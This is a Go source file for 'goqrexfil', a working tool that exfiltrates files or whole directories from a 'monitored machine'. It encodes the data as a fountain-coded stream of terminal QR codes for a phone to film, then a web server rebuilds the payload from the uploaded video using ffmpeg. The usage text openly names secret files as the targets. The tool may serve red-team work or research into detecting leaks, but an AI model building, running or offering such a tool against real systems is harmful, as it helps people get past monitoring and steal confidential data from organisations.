package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"image"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"github.com/gin-gonic/gin"
	log "github.com/sirupsen/logrus"
	"golang.org/x/crypto/blake2b"
)

const (
	serverPort        = "9999"                    // TCP port to run the web service on
	ffmpegQuality     = "16"                      // Quality for frames to images conversion. 1-31. 5 for great, 10 for acceptable
	ffmpegImageScale  = "scale='min(iw,1600)':-1" // Cap very large (4K) frames at 1600px wide; never downscale normal frames, since shrinking the QR below ~600px breaks recognition
	secsBeforeDisplay = 3                         // seconds before starting to display QR codes
	msBetweenFrames   = 550                       // milliseconds each QR is held, to allow proper recording
	maxUploadSize     = 512 << 20                 // 512 MB upload cap
	defaultRedundancy = 50                        // default RaptorQ redundancy, in percent of k
)

// Output locations are variables (not consts) so tests can redirect them to temp dirs.
var (
	videoLocation = "./public/video.mp4"    // location of video uploaded to the web service
	retrieved     = "./payload/payload.bin" // path to output payload file
	extractedDir  = "./payload/extracted"   // where directory payloads are unpacked
)

// ffmpegPath resolves the ffmpeg binary, preferring PATH and falling back to
// common install locations (Homebrew on Apple Silicon/Intel, MacPorts).
func ffmpegPath() string {
	if p, err := exec.LookPath("ffmpeg"); err == nil {
		return p
	}
	for _, p := range []string{
		"/opt/homebrew/bin/ffmpeg",
		"/usr/local/bin/ffmpeg",
		"/opt/local/bin/ffmpeg",
		"/usr/bin/ffmpeg",
	} {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	return "ffmpeg"
}

type retrievalResult struct {
	complete bool
	received int
	base     int // estimated k (base symbols needed)
	payload  []byte
	files    int    // if a directory payload, number of files extracted
	dest     string // where the payload/files were written
}

// savePayload writes the reassembled payload, unpacking directory payloads and
// verifying their manifest. Returns the destination path.
func savePayload(payload []byte) (int, string, error) {
	if isTarGZ(payload) {
		dest := extractedDir
		n, err := extractDirectoryPayload(payload, dest)
		return n, dest, err
	}
	if err := writePayloadFile(payload, retrieved); err != nil {
		return 0, "", err
	}
	return 0, retrieved, nil
}

// retrievePayload extracts frames from the uploaded video, feeds the QR symbols
// to a RaptorQ decoder, and stops as soon as the payload is reconstructable.
func retrievePayload() *retrievalResult {
	files, err := filepath.Glob("./public/*png")
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[***] Cleaning old files and extracting video frames")
	for _, f := range files {
		if err := os.Remove(f); err != nil {
			log.Fatal(err)
		}
	}

	cmd := exec.Command(ffmpegPath(), "-i", videoLocation,
		"-loglevel", "error",
		"-qscale:v", ffmpegQuality,
		"-vf", ffmpegImageScale,
		"-vsync", "vfr",
		"./public/%03d.png")
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		log.Fatal(err)
	}

	dec := &decoder{}
	matches, _ := filepath.Glob("./public/*png")
	fmt.Println("[***] Extracting symbols from", len(matches), "frames")
	lastReport := 0
	for _, match := range matches {
		f, err := os.Open(match)
		if err != nil {
			continue
		}
		img, _, err := image.Decode(f)
		_ = f.Close()
		if err != nil {
			continue
		}
		raw := DecodeQRCode(img)
		if raw == "" {
			continue
		}
		cl, id, sym, ok := parseSymbol(raw)
		if !ok {
			fmt.Println("[!] Skipping frame", match, "with unrecognized format")
			continue
		}
		done, err := dec.add(id, sym, cl)
		if err != nil {
			log.Errorf("decoder: %v", err)
			continue
		}
		if r := dec.receivedCount(); r > lastReport+24 {
			lastReport = r
			fmt.Printf("[*] received %d symbols (need ~%d)\n", r, dec.baseSymbols())
		}
		if done {
			payload, err := dec.finish()
			if err != nil {
				log.Fatalf("reconstruct: %v", err)
			}
			n, dest, err := savePayload(payload)
			if err != nil {
				log.Fatalf("save payload: %v", err)
			}
			h := blake2b.Sum256(payload)
			fmt.Printf("[*] Payload reconstructed from %d symbols (need ~%d)\n", dec.receivedCount(), dec.baseSymbols())
			if n > 0 {
				fmt.Println("[*] Directory payload:", n, "files extracted to", dest)
			} else {
				fmt.Println("[*] Payload saved as", dest)
			}
			fmt.Println("Payload hash", fmtHash(h[:]))
			return &retrievalResult{complete: true, received: dec.receivedCount(), base: dec.baseSymbols(), payload: payload, files: n, dest: dest}
		}
	}

	// Video exhausted without a solvable subset.
	res := &retrievalResult{received: dec.receivedCount(), base: dec.baseSymbols()}
	if dec.ready() {
		if payload, err := dec.finish(); err == nil {
			n, dest, _ := savePayload(payload)
			res.complete, res.payload, res.files, res.dest = true, payload, n, dest
			return res
		}
	}
	log.Info("!!! Not enough symbols recovered from analyzed frames - re-record the video")
	return res
}

func fmtHash(b []byte) string {
	const hexdigits = "0123456789abcdef"
	out := make([]byte, 0, len(b)*2)
	for _, v := range b {
		out = append(out, hexdigits[v>>4], hexdigits[v&0xF])
	}
	return string(out)
}

func writePayloadFile(payload []byte, filename string) error {
	if err := os.MkdirAll(filepath.Dir(filename), 0755); err != nil {
		return err
	}
	_ = os.Remove(filename)
	file, err := os.OpenFile(filename, os.O_WRONLY|os.O_TRUNC|os.O_CREATE, 0600)
	if err != nil {
		return err
	}
	if _, err := file.Write(payload); err != nil {
		file.Close()
		return err
	}
	return file.Close()
}

// tokenMiddleware, when token is non-empty, requires the token (query param or
// form field) on the request.
func tokenMiddleware(token string) gin.HandlerFunc {
	return func(c *gin.Context) {
		if token == "" {
			c.Next()
			return
		}
		provided := c.Query("token")
		if provided == "" {
			provided = c.PostForm("token")
		}
		if provided != token {
			c.String(http.StatusUnauthorized, "missing or invalid token")
			c.Abort()
			return
		}
		c.Next()
	}
}

// uploadForm renders the upload page, embedding the token as a hidden field.
func uploadForm(token string) string {
	tokenField := ""
	if token != "" {
		tokenField = fmt.Sprintf("<input type=\"hidden\" name=\"token\" value=\"%s\">", token)
	}
	return `<html lang="en-us"><body>
<h2>goqrexfil</h2>
<p>Upload the video you recorded of the QR stream.</p>
<form action="/upload" enctype="multipart/form-data" method="POST">
` + tokenField + `    <input accept="*" name="file" type="file"/>
    <button type="submit">submit</button>
</form>
</body></html>`
}

func webService(token string, tlsEnabled bool, certFile, keyFile string) {
	gin.SetMode("release")
	router := gin.New()
	router.MaxMultipartMemory = maxUploadSize
	router.Use(tokenMiddleware(token))

	router.GET("/", func(c *gin.Context) {
		c.String(http.StatusOK, uploadForm(token))
	})
	router.GET("/payload", func(c *gin.Context) {
		if _, err := os.Stat(retrieved); err != nil {
			c.String(http.StatusNotFound, "no payload available yet")
			return
		}
		c.Header("Content-Disposition", "attachment; filename="+filepath.Base(retrieved))
		c.Header("Content-Type", "application/octet-stream")
		c.File(retrieved)
	})
	// /missing lists how many more symbols are needed (fountain codes: any more
	// of the stream helps, so this is advisory).
	router.GET("/missing", func(c *gin.Context) {
		c.String(http.StatusOK, "fountain-coded: re-record the stream; any additional symbols help")
	})
	router.POST("/upload", func(c *gin.Context) {
		file, err := c.FormFile("file")
		if err != nil {
			c.String(http.StatusBadRequest, fmt.Sprintf("get form err: %s", err.Error()))
			return
		}
		if err := c.SaveUploadedFile(file, videoLocation); err != nil {
			c.String(http.StatusBadRequest, fmt.Sprintf("upload file err: %s", err.Error()))
			return
		}
		log.Println("\n[*] File received")

		result := retrievePayload()
		var myLink string
		switch {
		case result.complete:
			if result.files > 0 {
				myLink = fmt.Sprintf("<b>Directory payload: %d files</b> extracted to <code>%s</code>.", result.files, result.dest)
			} else {
				myLink = "<b>Payload retrieved.</b> <a href='/payload'>download payload</a>"
			}
		case result.received > 0:
			myLink = fmt.Sprintf("<b>Partial: %d symbols received (need ~%d).</b> Not enough to decode yet - re-record the video (any additional symbols help).", result.received, result.base)
		default:
			myLink = "<b>No payload retrieved.</b>"
		}
		if _, err = c.Writer.Write([]byte(myLink)); err != nil {
			log.Fatal("Cannot write response")
		}
	})
	router.Static("/process", "./public")

	srv := &http.Server{Addr: ":" + serverPort, Handler: router}
	if tlsEnabled {
		cert, fp, err := loadOrGenerateTLS(certFile, keyFile)
		if err != nil {
			log.Fatal(err)
		}
		if certFile == "" || keyFile == "" {
			fmt.Println("[*] Using self-signed certificate, SHA-256 fingerprint:")
			fmt.Println("   ", fp)
		}
		srv.TLSConfig = &tls.Config{Certificates: []tls.Certificate{cert}}
		log.Info("Serving TLS on port ", serverPort)
		if err := srv.ListenAndServeTLS("", ""); err != nil {
			log.Fatal(err)
		}
		return
	}
	log.Info("Serving on port ", serverPort)
	if err := srv.ListenAndServe(); err != nil {
		log.Fatal(err)
	}
}

// clientMode reads the payload, encodes it as a RaptorQ symbol stream, and
// displays each symbol as a terminal QR code for video recording.
func clientMode(path string, redundancy int, dryRun, noQuiet bool) {
	fmt.Println("[***] Client mode: ON")
	data, name, err := resolvePayloadSource(path)
	if err != nil {
		log.Fatalf("failed to read payload: %s", err)
	}
	if len(data) == 0 {
		log.Fatalf("No data read from source %q", name)
	}
	h := blake2b.Sum256(data)
	fmt.Println("[*] Source:", name, "("+humanSize(int64(len(data)))+")")
	fmt.Println("Plaintext hash", fmtHash(h[:]))

	framed, k, err := encodePayload(data, redundancy)
	if err != nil {
		log.Fatalf("encode: %v", err)
	}
	m := len(framed)
	secs := float64(m) * msBetweenFrames / 1000
	fmt.Printf("\n[*] %d base symbols, %d total (redundancy %d%%)\n", k, m, redundancy)
	fmt.Printf("[*] Estimated recording time: ~%.0fs\n", secs)

	if dryRun {
		fmt.Println("[*] Dry run: nothing displayed.")
		return
	}

	// Warn if the QR is wider than the terminal.
	qz := 4
	if noQuiet {
		qz = 0
	}
	if w, err := qrTerminalWidth(framed[0], qz); err == nil {
		if cols := termCols(); cols > 0 && w > cols {
			fmt.Printf("[!] QR is ~%d columns wide but terminal is %d. Widen the terminal%s.\n",
				w, cols, hintNoQuiet(noQuiet))
		}
	}

	fmt.Println("[***] Point your phone at this terminal, start recording, then in >", secsBeforeDisplay, "< seconds ****")
	time.Sleep(secsBeforeDisplay * time.Second)

	for i, f := range framed {
		time.Sleep(msBetweenFrames * time.Millisecond)
		caption := fmt.Sprintf("goqrexfil  symbol %d / %d", i+1, m)
		if err := displayQRTerminal(f, caption, qz); err != nil {
			log.Fatalf("display: %v", err)
		}
	}
	time.Sleep(msBetweenFrames * time.Millisecond)
	fmt.Printf("\x1b[2J\x1b[HDone - stop recording. You sent %d symbols.\n", m)
}

func hintNoQuiet(noQuiet bool) string {
	if noQuiet {
		return ""
	}
	return " (or re-run with --no-quiet-zone to save 8 columns)"
}

// termCols best-effort terminal width from $COLUMNS (0 if unknown).
func termCols() int {
	if c := os.Getenv("COLUMNS"); c != "" {
		var n int
		if _, err := fmt.Sscanf(c, "%d", &n); err == nil {
			return n
		}
	}
	return 0
}

func selfTest(data []byte) {
	fmt.Println("[***] Self-test mode: local QR round-trip, no camera needed")
	framed, k, err := encodePayload(data, defaultRedundancy)
	if err != nil {
		log.Fatalf("encode: %v", err)
	}
	m := len(framed)
	fmt.Printf("[*] %d base symbols, %d total\n", k, m)

	dir, err := os.MkdirTemp("", "goqrexfil-selftest-")
	if err != nil {
		log.Fatal(err)
	}
	defer os.RemoveAll(dir)

	dec := &decoder{}
	// Simulate a lossy capture: keep only 80% of the symbols.
	kept := 0
	for i, f := range framed {
		if i%5 == 4 {
			continue // dropped frame
		}
		kept++
		pngBytes := encodeQR(f)
		if err := os.WriteFile(filepath.Join(dir, fmt.Sprintf("%04d.png", i)), pngBytes, 0644); err != nil {
			log.Fatal(err)
		}
	}
	fmt.Println("[*] Wrote", kept, "of", m, "QR PNGs (simulating 80% capture) to", dir)

	matches, _ := filepath.Glob(filepath.Join(dir, "*.png"))
	for _, match := range matches {
		f, err := os.Open(match)
		if err != nil {
			log.Fatal(err)
		}
		img, _, err := image.Decode(f)
		_ = f.Close()
		if err != nil {
			log.Fatal(err)
		}
		cl, id, sym, ok := parseSymbol(DecodeQRCode(img))
		if !ok {
			log.Fatalf("FAIL: could not decode QR in %s", match)
		}
		if _, err := dec.add(id, sym, cl); err != nil {
			log.Fatalf("FAIL: decoder error: %v", err)
		}
	}

	out, err := dec.finish()
	if err != nil {
		log.Fatalf("FAIL: %v", err)
	}
	if string(out) != string(data) {
		log.Fatalf("FAIL: payload mismatch (got %d bytes, want %d)", len(out), len(data))
	}
	hh := blake2b.Sum256(out)
	fmt.Println("[*] PASS: round-trip OK from 80% of symbols, payload hash", fmtHash(hh[:]))
}

func main() {
	log.SetFormatter(&log.TextFormatter{})
	isServer := flag.Bool("server", false, "Server mode")
	isClient := flag.Bool("client", false, "Client mode")
	isSelfTest := flag.Bool("selftest", false, "Self-test: encode and decode QRs locally, no camera needed")
	isProcessing := flag.Bool("retrievePayload", false, "Processing existing video only (debug mode)")
	token := flag.String("token", "", "Server: require this shared token on upload/download")
	tlsEnabled := flag.Bool("tls", false, "Server: serve over TLS (self-signed if no cert/key given)")
	tlsCert := flag.String("tls-cert", "", "Server: TLS certificate file (with --tls)")
	tlsKey := flag.String("tls-key", "", "Server: TLS key file (with --tls)")
	redundancy := flag.Int("redundancy", defaultRedundancy, "Client: RaptorQ redundancy as % of base symbols")
	dryRun := flag.Bool("dry-run", false, "Client: show symbol count and time estimate, display nothing")
	noQuiet := flag.Bool("no-quiet-zone", false, "Client: omit the QR quiet zone to save 8 columns")
	flag.Parse()

	if *isSelfTest {
		data, _, err := resolvePayloadSource(flag.Arg(0))
		if err != nil {
			log.Fatalf("failed to read payload: %s", err)
		}
		if len(data) == 0 {
			log.Fatalf("No data read from source")
		}
		selfTest(data)
	} else if *isProcessing {
		log.Println("Processing only - DEBUG MODE")
		_ = retrievePayload()
	} else if *isServer {
		fmt.Println("[*] Server mode: ON")
		webService(*token, *tlsEnabled, *tlsCert, *tlsKey)
	} else if *isClient {
		path := ""
		if flag.NArg() > 0 {
			path = flag.Arg(0)
		}
		clientMode(path, *redundancy, *dryRun, *noQuiet)
	} else {
		fmt.Println("goqrexfil - exfiltrate data as QR codes captured on video")
		fmt.Println()
		fmt.Println("Client (on the monitored machine):")
		fmt.Println("  cat top.secret.file | ./goqrexfil --client           display QR stream on stdin")
		fmt.Println("  ./goqrexfil --client ./secrets                        pack a directory and display")
		fmt.Println("  ./goqrexfil --client --dry-run ./secrets              show size/time estimate only")
		fmt.Println("  ./goqrexfil --client --redundancy 100 ./secrets       more redundancy (longer, more robust)")
		fmt.Println("  cat file | ./goqrexfil --selftest                     local round-trip test, no camera")
		fmt.Println()
		fmt.Println("Server (on your machine):")
		fmt.Println("  ./goqrexfil --server                                 web server on port 9999")
		fmt.Println("  ./goqrexfil --server --token SECRET                  require a shared token")
		fmt.Println("  ./goqrexfil --server --tls                           serve over TLS (self-signed)")
		fmt.Println("  ./goqrexfil --retrievePayload                        re-process ./public/video.mp4")
		fmt.Println()
		os.Exit(1)
	}
}
